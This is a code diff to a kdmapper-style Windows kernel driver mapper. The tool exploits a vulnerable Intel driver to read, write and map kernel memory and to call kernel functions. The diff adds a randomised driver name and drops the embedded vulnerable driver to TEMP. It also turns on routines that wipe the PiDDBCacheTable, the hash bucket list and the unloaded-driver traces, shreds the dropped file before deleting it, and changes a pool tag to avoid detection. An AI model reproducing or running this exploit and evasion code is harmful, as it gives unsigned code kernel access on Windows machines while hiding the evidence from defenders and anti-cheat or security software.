@@ -1,31 +1,30 @@
 #include "intel_driver.hpp"
 
+#define IOCTL_BASE 0x800
+#define IOCTL_CODE(i) CTL_CODE(FILE_DEVICE_UNKNOWN,IOCTL_BASE+i,METHOD_BUFFERED,FILE_ANY_ACCESS)
+#define IOCTL_COPY_MEMORY IOCTL_CODE(1)
+#define IOCTL_FILL_MEMORY IOCTL_CODE(2)
+#define IOCTL_GET_PHYS_ADDRESS IOCTL_CODE(3)
+#define IOCTL_MAP_IO_SPACE IOCTL_CODE(4)
+#define IOCTL_UNMAP_IO_SPACE IOCTL_CODE(5)
+
 ULONG64 intel_driver::ntoskrnlAddr = 0;
 char intel_driver::driver_name[100] = {};
 uintptr_t PiDDBLockPtr;
 uintptr_t PiDDBCacheTablePtr;
 
 std::wstring intel_driver::GetDriverNameW() {
-	return L"MapDriver.sys";
+	std::string t(intel_driver::driver_name);
+	std::wstring name(t.begin(), t.end());
+	return name;
 }
 
 std::wstring intel_driver::GetDriverPath() {
-	return L"D:\\vcpp\\kdmapper\\x64\\Debug\\MapDriver\\" + GetDriverNameW();
-}
-
-bool intel_driver::CallDriverFunction(HANDLE device_handle, NTSTATUS* out_result, uint64_t kernel_function_address, ULONG64 param1, ULONG64 param2)
-{
-	DWORD bytes_returned;
-	WRIO InBuffer = { 0 };
-	WRIO OutBuffer = { 0 };
-
-	InBuffer.destination = kernel_function_address;
-	InBuffer.param1 = param1;
-	InBuffer.param2 = param2;
-
-	bool r =  DeviceIoControl(device_handle, IOCTL_CALL_DRIVER, &InBuffer, sizeof(InBuffer), &OutBuffer, sizeof(OutBuffer), &bytes_returned, nullptr);
-	*out_result = OutBuffer.out_result;
-	return r;
+	std::wstring temp = utils::GetFullTempPath();
+	if (temp.empty()) {
+		return L"";
+	}
+	return temp + L"\\" + GetDriverNameW();
 }
 
 bool intel_driver::IsRunning() {
@@ -39,14 +38,34 @@ bool intel_driver::IsRunning() {
 }
 
 HANDLE intel_driver::Load() {
+	srand((unsigned)time(NULL) * GetCurrentThreadId());
+
+	//from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
 	if (intel_driver::IsRunning()) {
 		Log(L"[-] \\Device\\Nal is already in use." << std::endl);
 		return INVALID_HANDLE_VALUE;
 	}
 
+	memset(intel_driver::driver_name, 0, sizeof(intel_driver::driver_name));
+	static const char alphanum[] =
+		"abcdefghijklmnopqrstuvwxyz"
+		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+	int len = rand() % 20 + 10;
+	for (int i = 0; i < len; ++i)
+		intel_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+
+	Log(L"[<] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);
+
 	std::wstring driver_path = GetDriverPath();
 	if (driver_path.empty()) {
 		Log(L"[-] Can't find TEMP folder" << std::endl);
+		return INVALID_HANDLE_VALUE;
+	}
+
+	_wremove(driver_path.c_str());
+
+	if(!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
+		Log(L"[-] Failed to create vulnerable driver file" << std::endl);
 		return INVALID_HANDLE_VALUE;
 	}
 
@@ -71,24 +90,24 @@ HANDLE intel_driver::Load() {
 		intel_driver::Unload(result);
 		return INVALID_HANDLE_VALUE;
 	}
-	// 
-	// if (!intel_driver::ClearPiDDBCacheTable(result)) {
-	// 	Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
-	// 	intel_driver::Unload(result);
-	// 	return INVALID_HANDLE_VALUE;
-	// }
-	// 
-	// if (!intel_driver::ClearKernelHashBucketList(result)) {
-	// 	Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
-	// 	intel_driver::Unload(result);
-	// 	return INVALID_HANDLE_VALUE;
-	// }
-	// 
-	// if (!intel_driver::ClearMmUnloadedDrivers(result)) {
-	// 	Log(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
-	// 	intel_driver::Unload(result);
-	// 	return INVALID_HANDLE_VALUE;
-	// }
+	
+	if (!intel_driver::ClearPiDDBCacheTable(result)) {
+		Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
+		intel_driver::Unload(result);
+		return INVALID_HANDLE_VALUE;
+	}
+	
+	if (!intel_driver::ClearKernelHashBucketList(result)) {
+		Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
+		intel_driver::Unload(result);
+		return INVALID_HANDLE_VALUE;
+	}
+	
+	if (!intel_driver::ClearMmUnloadedDrivers(result)) {
+		Log(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
+		intel_driver::Unload(result);
+		return INVALID_HANDLE_VALUE;
+	}
 
 	return result;
 }
@@ -103,6 +122,28 @@ bool intel_driver::Unload(HANDLE device_handle) {
 	if (!service::StopAndRemove(GetDriverNameW()))
 		return false;
 
+	std::wstring driver_path = GetDriverPath();
+
+	//Destroy disk information before unlink from disk to prevent any recover of the file
+	std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
+	int newFileLen = sizeof(intel_driver_resource::driver) + ((long long)rand() % 2348767 + 56725);
+	BYTE* randomData = new BYTE[newFileLen];
+	for (size_t i = 0; i < newFileLen; i++) {
+		randomData[i] = (BYTE)(rand() % 255);
+	}
+	if (!file_ofstream.write((char*)randomData, newFileLen)) {
+		Log(L"[!] Error dumping shit inside the disk" << std::endl);
+	}
+	else {
+		Log(L"[+] Vul driver data destroyed before unlink" << std::endl);
+	}
+	file_ofstream.close();
+	delete[] randomData;
+
+	//unlink the file
+	if (_wremove(driver_path.c_str()) != 0)
+		return false;
+
 	return true;
 }
 
@@ -110,46 +151,45 @@ bool intel_driver::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t 
 	if (!destination || !source || !size)
 		return 0;
 
-	WRIO InBuffer = { 0 };
+	WRIO IoBuffer = { 0 };
 
-	InBuffer.source = source;
-	InBuffer.destination = destination;
-	InBuffer.length = size;
+	IoBuffer.source = source;
+	IoBuffer.destination = destination;
+	IoBuffer.length = size;
 
 	DWORD bytes_returned = 0;
-	return DeviceIoControl(device_handle, IOCTL_COPY, &InBuffer, sizeof(InBuffer), nullptr, 0, &bytes_returned, nullptr);
+	return DeviceIoControl(device_handle, IOCTL_COPY_MEMORY, &IoBuffer, sizeof(IoBuffer), nullptr, 0, &bytes_returned, nullptr);
 }
 
 bool intel_driver::SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size) {
 	if (!address || !size)
 		return 0;
 
-	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };
+	WRIO IoBuffer = { 0 };
 
-	fill_memory_buffer.case_number = 0x30;
-	fill_memory_buffer.destination = address;
-	fill_memory_buffer.value = value;
-	fill_memory_buffer.length = size;
+	IoBuffer.destination = address;
+	IoBuffer.value = value;
+	IoBuffer.length = size;
 
 	DWORD bytes_returned = 0;
-	return DeviceIoControl(device_handle, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
+	return DeviceIoControl(device_handle, IOCTL_FILL_MEMORY, &IoBuffer, sizeof(IoBuffer), nullptr, 0, &bytes_returned, nullptr);
 }
 
 bool intel_driver::GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address) {
 	if (!address)
 		return 0;
 
-	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };
+	WRIO IoBuffer = { 0 };
+	WRIO OutBuffer = { 0 };
 
-	get_phys_address_buffer.case_number = 0x25;
-	get_phys_address_buffer.address_to_translate = address;
+	IoBuffer.address_to_translate = address;
 
 	DWORD bytes_returned = 0;
 
-	if (!DeviceIoControl(device_handle, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
+	if (!DeviceIoControl(device_handle, IOCTL_GET_PHYS_ADDRESS, &IoBuffer, sizeof(IoBuffer), &OutBuffer, sizeof(OutBuffer), &bytes_returned, nullptr))
 		return false;
 
-	*out_physical_address = get_phys_address_buffer.return_physical_address;
+	*out_physical_address = OutBuffer.return_physical_address;
 	return true;
 }
 
@@ -157,33 +197,32 @@ uint64_t intel_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_addres
 	if (!physical_address || !size)
 		return 0;
 
-	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };
+	WRIO IoBuffer = { 0 };
+	WRIO OutBuffer = { 0 };
 
-	map_io_space_buffer.case_number = 0x19;
-	map_io_space_buffer.physical_address_to_map = physical_address;
-	map_io_space_buffer.size = size;
+	IoBuffer.physical_address_to_map = physical_address;
+	IoBuffer.size = size;
 
 	DWORD bytes_returned = 0;
 
-	if (!DeviceIoControl(device_handle, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
+	if (!DeviceIoControl(device_handle, IOCTL_MAP_IO_SPACE, &IoBuffer, sizeof(IoBuffer), &OutBuffer, sizeof(OutBuffer), &bytes_returned, nullptr))
 		return 0;
 
-	return map_io_space_buffer.return_virtual_address;
+	return OutBuffer.return_virtual_address;
 }
 
 bool intel_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size) {
 	if (!address || !size)
 		return false;
 
-	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };
+	WRIO IoBuffer = { 0 };
 
-	unmap_io_space_buffer.case_number = 0x1A;
-	unmap_io_space_buffer.virt_address = address;
-	unmap_io_space_buffer.number_of_bytes = size;
+	IoBuffer.virt_address = address;
+	IoBuffer.number_of_bytes = size;
 
 	DWORD bytes_returned = 0;
 
-	return DeviceIoControl(device_handle, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
+	return DeviceIoControl(device_handle, IOCTL_UNMAP_IO_SPACE, &IoBuffer, sizeof(IoBuffer), nullptr, 0, &bytes_returned, nullptr);
 }
 
 bool intel_driver::ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
@@ -314,32 +353,33 @@ uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_typ
 	if (!size)
 		return 0;
 
-	DWORD bytes_returned;
-	WRIO InBuffer = { 0 };
-	WRIO OutBuffer = { 0 };
+	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");
 
-	InBuffer.pool_type = (uint64_t)pool_type;
-	InBuffer.length = size;
-	InBuffer.pool_tag = 'BwtE';
-
-	if (!DeviceIoControl(device_handle, IOCTL_ALLOC, &InBuffer, sizeof(InBuffer), &OutBuffer, sizeof(OutBuffer), &bytes_returned, nullptr))
-	{
+	if (!kernel_ExAllocatePool) {
+		Log(L"[!] Failed to find ExAllocatePool" << std::endl);
 		return 0;
 	}
 
-	return OutBuffer.destination;
+	uint64_t allocated_pool = 0;
+
+	if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'BwtE')) //Changed pool tag since an extremely meme checking diff between allocation size and average for detection....
+		return 0;
+
+	return allocated_pool;
 }
 
 bool intel_driver::FreePool(HANDLE device_handle, uint64_t address) {
 	if (!address)
 		return 0;
 
-	DWORD bytes_returned;
-	WRIO InBuffer = { 0 };
+	static uint64_t kernel_ExFreePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExFreePool");
 
-	InBuffer.destination = address;
+	if (!kernel_ExFreePool) {
+		Log(L"[!] Failed to find ExAllocatePool" << std::endl);
+		return 0;
+	}
 
-	return DeviceIoControl(device_handle, IOCTL_FREE, &InBuffer, sizeof(InBuffer), nullptr, 0, &bytes_returned, nullptr);
+	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExFreePool, address);
 }
 
 uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name) {
